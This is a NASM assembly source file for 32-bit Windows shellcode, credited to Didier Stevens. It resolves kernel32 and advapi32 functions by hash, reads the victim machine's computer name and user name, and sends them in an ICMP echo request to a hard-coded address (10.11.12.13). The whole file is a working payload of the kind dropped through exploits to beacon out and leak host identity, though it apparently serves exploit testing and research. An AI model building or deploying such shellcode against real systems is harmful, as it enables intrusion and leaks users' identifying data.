; Shellcode to ping an IP address with computername & username
; Written for NASM assembler (http://www.nasm.us) by Didier Stevens
; https://DidierStevens.com
; Use at your own risk
;
; History:
;   2010/02/16: start
;   2010/02/17: cleanup

BITS 32

KERNEL32_HASH equ 0x000d4e88
KERNEL32_NUMBER_OF_FUNCTIONS 			equ 4
KERNEL32_LOADLIBRARYA_HASH				equ 0x000d5786
KERNEL32_GETPROCADDRESS_HASH			equ 0x00348bfa
KERNEL32_LOCALALLOC_HASH					equ 0x00035542
KERNEL32_GETCOMPUTERNAMEA_HASH		equ 0x00d0be8e

ADVAPI32_HASH 										equ 0x000ca608
ADVAPI32_NUMBER_OF_FUNCTIONS 			equ 1
ADVAPI32_GETUSERNAMEA_HASH 				equ 0x000d2d8e

segment .text
	call geteip
geteip:
	pop ebx

  ; Setup environment kernel32
	lea esi, [KERNEL32_FUNCTIONS_TABLE-geteip+ebx]
	push esi
	lea esi, [KERNEL32_HASHES_TABLE-geteip+ebx]
	push esi
	push byte KERNEL32_NUMBER_OF_FUNCTIONS
	push KERNEL32_HASH
	call LookupFunctions

  ; Setup environment Advapi32 (we assume the DLL is loaded)
	lea esi, [ADVAPI32_FUNCTIONS_TABLE-geteip+ebx]
	push esi
	lea esi, [ADVAPI32_HASHES_TABLE-geteip+ebx]
	push esi
	push byte ADVAPI32_NUMBER_OF_FUNCTIONS
	push ADVAPI32_HASH
	call LookupFunctions

	; Setup Iphlpapi.dll
	lea esi, [IPHLPAPIDLL-geteip+ebx]
	push esi
	call [KERNEL32_LOADLIBRARY-geteip+ebx]
	push eax
	lea esi, [ICMPCREATEFILE-geteip+ebx]
	push esi
	push eax
	call [KERNEL32_GETPROCADDRA-geteip+ebx]
	mov [IPHLPAPIDLL_ICMPCREATEFILE-geteip+ebx], eax
	pop eax
	push eax
	lea esi, [ICMPSENDECHO-geteip+ebx]
	push esi
	push eax
	call [KERNEL32_GETPROCADDRA-geteip+ebx]
	mov [IPHLPAPIDLL_ICMPSENDECHO-geteip+ebx], eax
	pop eax
	lea esi, [ICMPCLOSEHANDLE-geteip+ebx]
	push esi
	push eax
	call [KERNEL32_GETPROCADDRA-geteip+ebx]
	mov [IPHLPAPIDLL_ICMPCLOSEHANDLE-geteip+ebx], eax

	; LocalAlloc(IN UINT uFlags, IN SIZE_T uBytes);
	push dword [REQUESTDATA_SIZE-geteip+ebx]
	push byte 0x40 ; LPTR
	call [KERNEL32_LOCALALLOC-geteip+ebx]
	mov [REQUESTDATA-geteip+ebx], eax

	; BOOL WINAPI GetComputerName(LPTSTR lpBuffer, LPDWORD lpnSize);
	mov [SIZE-geteip+ebx], dword COMPUTERNAME_SIZE
	lea esi, [SIZE-geteip+ebx]
	push esi
	push dword [REQUESTDATA-geteip+ebx]
	call [KERNEL32_GETCOMPUTERNAMEA-geteip+ebx]

	; BOOL WINAPI GetUserName(LPTSTR lpBuffer, LPDWORD lpnSize);
	mov [SIZE-geteip+ebx], dword USERNAME_SIZE
	lea esi, [SIZE-geteip+ebx]
	push esi
	mov esi, dword [REQUESTDATA-geteip+ebx]
	add esi, COMPUTERNAME_SIZE
	push esi
	call [ADVAPI32_GETUSERNAMEA-geteip+ebx]

	; LocalAlloc(IN UINT uFlags, IN SIZE_T uBytes);
	push byte REPLYBUFFER_SIZE
	push byte 0x00 ; LMEM_FIXED
	call [KERNEL32_LOCALALLOC-geteip+ebx]
	mov [REPLYBUFFER-geteip+ebx], eax

	; Send the ICMP echo
	call [IPHLPAPIDLL_ICMPCREATEFILE-geteip+ebx]
	push eax
	push 1000
	push REPLYBUFFER_SIZE
	push DWORD [REPLYBUFFER-geteip+ebx]
	push 0x00
	push dword [REQUESTDATA_SIZE-geteip+ebx]
	push dword [REQUESTDATA-geteip+ebx]
	push dword [IPADDRESS-geteip+ebx]
	push eax
	call [IPHLPAPIDLL_ICMPSENDECHO-geteip+ebx]
	call [IPHLPAPIDLL_ICMPCLOSEHANDLE-geteip+ebx]

	ret

%include "sc-api-functions.asm"

KERNEL32_HASHES_TABLE:
	dd KERNEL32_LOADLIBRARYA_HASH
	dd KERNEL32_GETPROCADDRESS_HASH
	dd KERNEL32_LOCALALLOC_HASH
	dd KERNEL32_GETCOMPUTERNAMEA_HASH

ADVAPI32_HASHES_TABLE:
	dd ADVAPI32_GETUSERNAMEA_HASH

KERNEL32_FUNCTIONS_TABLE:
KERNEL32_LOADLIBRARY				dd 0x00000000
KERNEL32_GETPROCADDRA				dd 0x00000000
KERNEL32_LOCALALLOC					dd 0x00000000
KERNEL32_GETCOMPUTERNAMEA		dd 0x00000000

ADVAPI32_FUNCTIONS_TABLE:
ADVAPI32_GETUSERNAMEA				dd 0x00000000

IPHLPAPIDLL_ICMPCREATEFILE		dd 0x00000000
IPHLPAPIDLL_ICMPSENDECHO			dd 0x00000000
IPHLPAPIDLL_ICMPCLOSEHANDLE		dd 0x00000000

IPHLPAPIDLL:
	db "Iphlpapi.dll", 0
ICMPCREATEFILE:
	db "IcmpCreateFile", 0
ICMPSENDECHO:
	db "IcmpSendEcho", 0
ICMPCLOSEHANDLE:
	db "IcmpCloseHandle", 0

SIZE							dd 0x00000000
COMPUTERNAME_SIZE equ 16
USERNAME_SIZE equ 16
REQUESTDATA_SIZE  dd COMPUTERNAME_SIZE + USERNAME_SIZE
REQUESTDATA				dd 0x00000000
REPLYBUFFER_SIZE equ 41
REPLYBUFFER				dd 0x00000000

IPADDRESS db 10,11,12,13 ; the destination IP address: 10.11.12.13
